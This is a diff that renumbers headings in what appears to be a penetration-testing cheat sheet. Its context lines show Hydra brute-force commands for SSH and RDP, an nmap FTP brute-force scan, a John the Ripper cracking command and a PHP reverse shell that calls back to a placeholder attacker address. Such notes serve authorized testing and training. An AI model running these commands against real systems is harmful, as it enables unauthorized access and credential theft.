@@ -11,14 +11,14 @@
 - [6. Mysql](#mysql)
 - [7. Cewl](#cewl) - It is use to create a worldlist using website link
 - [8. Hydra](#hydra) - Brute force attack on ssh
-- [10.FTP](#ftp)
-- [11. Password Cracking](#cracking)
-- [12. RDP-3389](#rdp)
-- [13. Metasploit](/metasploit.md)
-- [14. netcat](#nc)
-- [15. Reverse_Shell_Script](https://revshells.com)
-- [16. Privilege escalation](/Privilege.md)
-- [17. Simple Local Web Servers](#localweb)
+- [9.FTP](#ftp)
+- [10. Password Cracking](#cracking)
+- [11. RDP-3389](#rdp)
+- [12. Metasploit](/metasploit.md)
+- [13. netcat](#nc)
+- [14. Reverse_Shell_Script](https://revshells.com)
+- [15. Privilege escalation](/Privilege.md)
+- [16. Simple Local Web Servers](#localweb)
 
 
 
@@ -111,7 +111,7 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 ssh
 
 
 
-# 10. FTP <a name="ftp"></a>
+# 9. FTP <a name="ftp"></a>
 ```
 nmap -Pn -A -p 21 -T4 --script=ftp-brute.nse --script-args userdb=/root/usr 10.0.1.22  -o namp
 ```
@@ -126,7 +126,7 @@ nmap -Pn -A -p 21 -T4 --script=ftp-brute.nse --script-args userdb=/root/usr 10.0
 
 
 
-# 11. Password Cracking <a name="cracking"></a>
+# 10. Password Cracking <a name="cracking"></a>
 ### John The Ripper
 ```
 john --format=descrypt --wordlist /usr/share/wordlists/rockyou.txt hash.txt
@@ -136,7 +136,7 @@ john --format=descrypt --wordlist /usr/share/wordlists/rockyou.txt hash.txt
 
 
 
-# 12. RDP-3389 <a name="rdp"></a>
+# 11. RDP-3389 <a name="rdp"></a>
 
 - `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /user/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://<target ip> -s <target port>`
 
@@ -160,7 +160,7 @@ exploit
 
 
 
-# 14. netcat <a name="nc"></a>
+# 13. netcat <a name="nc"></a>
 ```php
 <?php
  exec("/bin/bash -c 'bash -i >& /dev/tcp/attackerip/553 0>&1'");
@@ -184,7 +184,7 @@ __Download the reverse shell in windows__
 
 
 
-# 17. Simple Local Web Servers <a name="localweb"></a>
+# 16. Simple Local Web Servers <a name="localweb"></a>
 
 ```
 python -m SimpleHTTPServer 80
